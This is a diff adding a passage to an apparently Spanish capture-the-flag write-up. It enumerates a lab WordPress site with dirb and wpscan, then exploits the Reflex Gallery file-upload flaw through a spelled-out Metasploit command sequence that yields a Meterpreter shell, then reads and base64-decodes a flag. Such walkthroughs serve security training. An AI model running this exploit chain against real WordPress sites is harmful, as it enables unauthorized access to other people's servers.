@@ -86,3 +86,50 @@ stegcracker marsroversketch.jpg /usr/share/wordlists/rockyou.txt
 ```
 flag{b3d1baf22e078744ad7947519bf4}
 ```
+
+Revisamos elpuerto 80 en la web y en un principio lo que obtenemos es una imagen:
+<p align="center"> <img src="../../img_JCE_UCI2024/reto3-7.PNG" /> </p>
+
+Con la herramienta ```dirbuster``` encontramos directorio de wordpress (**/music/wordpress/**).
+```
+dirb http://10.32.2.46
+```
+Posteriormente utilizamos la herramienta ```wpscan``` con la cual encontramos 2 vulnerabilidades y 3 usuarios potenciales
+```
+wpscan --url http://10.32.2.46/music/wordpress/
+```
+```
+Vulnerabilidades:
+- reflex gallery <= 3.1.3
+- multiple plugin - jQuery pretty Photo (XSS)
+
+Usuarios:
+- footprintson themoon
+- stleart
+- kipke
+```
+Con la herramienta ```metasploit``` encontramos un exploit disponible para la vulnerabilidad **reflex** el cual usamos para ganar acceso en la máquina víctima.
+<p align="center"> <img src="../../img_JCE_UCI2024/reto3-8.PNG" /> </p>
+
+```
+msfconsole
+msf5 > search reflex
+msf5 > use exploit/unix/webapp/wp_reflexgallery_file_upload
+msf5 exploit(unix/webapp/wp_reflexgallery_file_upload) > set RHOST 10.32.2.46
+msf5 exploit(unix/webapp/wp_reflexgallery_file_upload) > set TARGETURI /music/wordpress/
+msf5 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit
+meterpreter > shell
+```
+
+Dentro de la máquina víctima accedemos al directorio de Penny y listamos la tercera flag del reto.
+<p align="center"> <img src="../../img_JCE_UCI2024/reto3-10.PNG" /> </p>
+
+```
+cat .FLAG.penny.txt
+  RkxBRy1wZW5ueXtkYWNlNTJiZGIyYTBiM2Y40TlkZmIzNDIzYTk5MmIyNX0=
+```
+La flag se encuentra cifrada en base64 por lo que la llevamos a texto claro.
+```
+echo "RkxBRy1wZW5ueXtkYWNlNTJiZGIyYTBiM2Y40TlkZmIzNDIzYTk5MmIyNX0=" | base64 -d
+```
+Tercera flag: ```flag{dace52bdb2a0b3f89dfb3423a992b25}```
